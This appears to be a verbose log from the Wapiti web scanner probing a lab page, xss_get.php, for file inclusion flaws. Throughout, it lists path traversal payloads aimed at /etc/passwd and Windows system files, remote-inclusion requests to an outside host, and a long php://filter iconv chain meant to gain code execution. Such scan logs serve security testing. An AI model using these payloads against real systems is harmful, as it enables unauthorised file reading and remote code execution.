2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:50.360 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:50.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:50.376 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:50.384 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:50.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:50.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:50.410 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:50.418 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:50.426 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:50.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:49:50.442 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:50.450 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:49:50.458 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:50.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:49:50.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:50.483 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:49:50.492 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:50.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:50.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:50.516 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:50.526 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=file%3A%2F%2F%2Fetc%2Fpasswd
2024-03-20 16:49:50.534 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
2024-03-20 16:49:50.542 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
2024-03-20 16:49:50.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
2024-03-20 16:49:50.557 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
2024-03-20 16:49:50.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
2024-03-20 16:49:50.571 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:49:50.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:49:50.587 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=xss_get.php
2024-03-20 16:49:50.595 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=xss_get.php%00
2024-03-20 16:49:50.602 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=xss_get.php%3A%3A%24DATA
2024-03-20 16:49:50.619 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:49:50.625 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&security_level=2
2024-03-20 16:49:50.634 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&security_level=2
2024-03-20 16:49:50.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.659 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.667 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
2024-03-20 16:49:50.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&security_level=2
2024-03-20 16:49:50.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&security_level=2
2024-03-20 16:49:50.699 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.707 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.714 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&security_level=2
2024-03-20 16:49:50.721 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&security_level=2
2024-03-20 16:49:50.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&security_level=2
2024-03-20 16:49:50.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.744 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.752 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.767 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.775 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.782 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.797 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.813 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.820 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.828 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&security_level=2
2024-03-20 16:49:50.837 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:49:50.853 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.861 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:49:50.868 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.905 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:49:50.912 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.920 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:49:50.928 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
